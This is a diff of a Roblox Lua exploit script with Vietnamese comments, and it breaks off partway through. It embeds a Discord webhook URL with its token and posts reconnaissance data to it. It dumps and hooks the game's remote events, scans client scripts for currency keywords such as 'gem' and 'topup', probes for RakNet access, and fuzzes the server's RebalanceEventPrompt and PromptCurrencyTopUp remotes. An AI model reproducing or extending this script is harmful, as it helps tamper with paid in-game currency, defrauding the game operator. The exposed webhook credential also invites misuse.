@@ -1,80 +1,119 @@
--- TTD FULL REMOTE DUMP + INTERACTION LOG
-local WEBHOOK = "https://discord.com/api/webhooks/1575380934860079217/70M7ZvEDzmoCA_YGtpvTc4khFp36TsZTQoLLwcOE5IfNoPEPRIXTqUORdcY8bZFgTNUf"
-
-local function wh(msg)
+local WH = "https://discord.com/api/webhooks/1575380934860079217/70M7ZvEDzmoCA_YGtpvTc4khFp36TsZTQoLLwcOE5IfNoPEPRIXTqUORdcY8bZFgTNUf"
+local function wh(m)
     pcall(function()
-        request({
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"]="application/json"},
-            Body = string.format('{"content":"%s"}', msg:gsub('"','\\"'):gsub("\n","\\n"))
-        })
+        request({Url=WH, Method="POST",
+            Headers={["Content-Type"]="application/json"},
+            Body='{"content":"'..m:gsub('"','\\"'):gsub("\n","\\n")..'"}'})
     end)
 end
 
-wh("FULL DUMP loaded.")
+wh("PHASE 2 loaded. Game chỉ có 2 remotes. Scan LocalScripts + RakNet.")
 
--- DUMP TẤT CẢ REMOTES
-local allRemotes = {}
-local function dump(p, d)
+-- ==================== 1. SCAN LOCALSCRIPTS ====================
+local found = {}
+local function scanScripts(p, d)
     d = d or 0
-    if d > 6 then return end
+    if d > 8 then return end
     for _,c in ipairs(p:GetChildren()) do
-        if c:IsA("RemoteEvent") then
-            allRemotes[#allRemotes+1] = "RE: "..c:GetFullName()
-        elseif c:IsA("RemoteFunction") then
-            allRemotes[#allRemotes+1] = "RF: "..c:GetFullName()
-        end
-        dump(c, d+1)
-    end
-end
-pcall(function() dump(game.ReplicatedStorage, 0) end)
-wh("TOTAL remotes: "..#allRemotes.."\n"..table.concat(allRemotes,"\n"))
-
--- HOOK TẤT CẢ — log khi có event/call
-local eventCount = 0
-local function hookAll(p, d)
-    d = d or 0
-    if d > 6 then return end
-    for _,c in ipairs(p:GetChildren()) do
-        if c:IsA("RemoteEvent") then
-            c.OnClientEvent:Connect(function(...)
-                eventCount = eventCount + 1
-                local a = {}
-                for i=1,select("#",...) do
-                    local v = select(i,...)
-                    if typeof(v)=="string" then a[#a+1]='"'..v:sub(1,40)..'"'
-                    elseif typeof(v)=="number" then a[#a+1]=tostring(v)
-                    elseif typeof(v)=="boolean" then a[#a+1]=tostring(v)
-                    elseif typeof(v)=="table" then a[#a+1]="table("..#v..")"
-                    else a[#a+1]=typeof(v) end
-                end
-                local msg = c.Name..": "..table.concat(a,", ")
-                if eventCount <= 20 then
-                    wh("EVENT["..eventCount.."] "..msg)
+        if c:IsA("LocalScript") or c:IsA("ModuleScript") then
+            local src = ""
+            pcall(function()
+                if c:IsA("LocalScript") then
+                    src = c.Source or ""
                 end
             end)
-        elseif c:IsA("RemoteFunction") then
-            local orig = c.InvokeServer
-            c.InvokeServer = function(self, ...)
-                local a = {}
-                for i=1,select("#",...) do
-                    local v = select(i,...)
-                    if typeof(v)=="string" then a[#a+1]='"'..v:sub(1,40)..'"'
-                    elseif typeof(v)=="number" then a[#a+1]=tostring(v)
-                    elseif typeof(v)=="boolean" then a[#a+1]=tostring(v)
-                    else a[#a+1]=typeof(v) end
+            if #src > 0 then
+                local l = src:lower()
+                local hits = {}
+                for _,k in ipairs({"gem","currency","balance","topup","top_up","rebalance","transfer","add_gem","remove_gem","spend","purchase"}) do
+                    if l:find(k) then hits[#hits+1] = k end
                 end
-                wh("CALL "..self.Name..": "..table.concat(a,", "))
-                local r = orig(self, ...)
-                wh("  RET: "..tostring(r))
-                return r
+                if #hits > 0 then
+                    found[#found+1] = c:GetFullName().." -> "..table.concat(hits,", ")
+                end
             end
         end
-        hookAll(c, d+1)
+        scanScripts(c, d+1)
     end
 end
-pcall(function() hookAll(game.ReplicatedStorage, 0) end)
 
-wh("All remotes hooked. BÂY GIỜ: mở shop / bấm top up / mua gem / bất kỳ tương tác nào. Log sẽ gửi webhook.")
-print("[RECON] Chờ tương tác...")
+pcall(function()
+    scanScripts(game.Workspace, 0)
+    scanScripts(game.CoreGui, 0)
+    scanScripts(game.ReplicatedStorage, 0)
+end)
+
+if #found > 0 then
+    wh("LOCALSCRIPT HITS ("..#found.."):\n"..table.concat(found,"\n"))
+else
+    wh("LOCALSCRIPT: không tìm thấy gem logic trong Source.")
+    wh("Gem có thể: (1) RakNet packet (2) server-only DataStore (3) obfuscated")
+end
+
+-- ==================== 2. RAKNET ====================
+local raknetFound = false
+pcall(function()
+    local candidates = {
+        {name="_G.raknet", fn=function() return _G.raknet end},
+        {name="getRakNet()", fn=function() return getRakNet and getRakNet() end},
+        {name="_G.RakNet", fn=function() return _G.RakNet end},
+        {name="require(RakNet)", fn=function()
+            local rs = game:GetService("ReplicatedStorage")
+            local r = rs:FindFirstChild("RakNet")
+            return r and require(r)
+        end},
+    }
+    for _,c in ipairs(candidates) do
+        local r = pcall(c.fn)
+        if r and c.fn() then
+            raknetFound = true
+            wh("RAKNET TÌM THẤY: "..c.name)
+            local rn = c.fn()
+            wh("  type: "..type(rn))
+            if type(rn) == "table" then
+                local keys = {}
+                for k,v in pairs(rn) do keys[#keys+1] = k.."("..type(v)..")" end
+                wh("  keys: "..table.concat(keys,", "))
+            end
+            break
+        end
+    end
+    if not raknetFound then
+        wh("RAKNET: không tìm thấy bằng 4 cách.")
+        wh("Bro kiểm tra: trong Delta console, gõ _G.raknet / getRakNet() / print(type(_G.raknet))")
+    end
+end)
+
+-- ==================== 3. THỬ GỌI RebalanceEventPrompt ====================
+wh("=== THỬ GỌI RebalanceEventPrompt ===")
+local rf = game.ReplicatedStorage:FindFirstChild("RebalanceEventPrompt")
+if rf and rf:IsA("RemoteFunction") then
+    -- Thử nhiều args, xem server phản hồi gì
+    local testArgs = {
+        {1},
+        {0},
+        {"test"},
+        {1, 0},
+        {1, 100},
+    }
+    for i, args in ipairs(testArgs) do
+        local ok, result = pcall(function()
+            return rf:InvokeServer(unpack(args))
+        end)
+        if ok then
+            wh("  Test "..i.." args="..table.concat(args,",").." -> RET: "..tostring(result))
+        else
+            wh("  Test "..i.." args="..table.concat(args,",").." -> ERROR: "..tostring(result))
+        end
+        wait(0.5)
+    end
+else
+    wh("  RebalanceEventPrompt: không tìm thấy hoặc không phải RemoteFunction")
+end
+
+-- ==================== 4. THỬ PromptCurrencyTopUp ====================
+wh("=== THỬ PromptCurrencyTopUp (FireServer) ===")
+local re = game.ReplicatedStorage:FindFirstChild("PromptCurrencyTopUp")
+if re and re:IsA("RemoteEvent") then
+    pcall(function()
+       
